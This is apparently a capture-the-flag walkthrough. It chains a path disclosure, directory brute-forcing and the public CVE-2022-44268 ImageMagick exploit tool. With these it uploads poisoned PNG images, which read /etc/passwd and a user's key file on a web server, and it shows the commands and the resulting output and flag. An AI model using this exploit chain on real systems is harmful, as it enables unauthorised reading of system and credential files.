# How to:

# STEP 1: path disclosure

```
http://[WEBSITE]/index.php?id[]=1
/var/www/html/sharing/
```

# STEP 2: dirbusting

```
/tools/resize.php
```

# STEP 3: reading /etc/passwd

Download the tool:\
https://github.com/kljunowsky/CVE-2022-44268

Poison a png image:
```sh
python3 -BO CVE-2022-44268.py --image ./winhome/Downloads/bg.jpg --output ./winhome/Downloads/etc_passwd.png --file-to-read /etc/passwd
```

Upload it via the website uploader `[WEBSITE]/index.php?id=2`

Resize it:
```
http://[WEBSITE]/tools/resize.php?path=/var/www/html/sharing/uploads/etc_passwd.png&width=1&height=1


<img src='../resized/resized_image_[RANDOMID].png' alt='Resized Image'>
```

Decrypt it:
```sh
python3 -BO CVE-2022-44268.py --url http://[WEBSITE]/resized/resized_image_[RANDOMID].png

root:x:0:0:root:/root:/bin/bash
[...]
jacobb:x:1000:1000::/home/jacobb:/bin/sh
```
# STEP 4: Retrieving the key
Poison a png image:
```sh
python3 -BO CVE-2022-44268.py --image ./winhome/Downloads/bg.jpg --output ./winhome/Downloads/jacobb.png --file-to-read /home/jacobb/key
```

Upload it, resize it and...
```sh
python3 -BO CVE-2022-44268.py --url http://[WEBSITE]/resized/resized_image_[RANDOMID].png

NTRLGC{sh4r1ng_0d4yz_t0_fr13ndz_is_4lw4ys_FUN}
```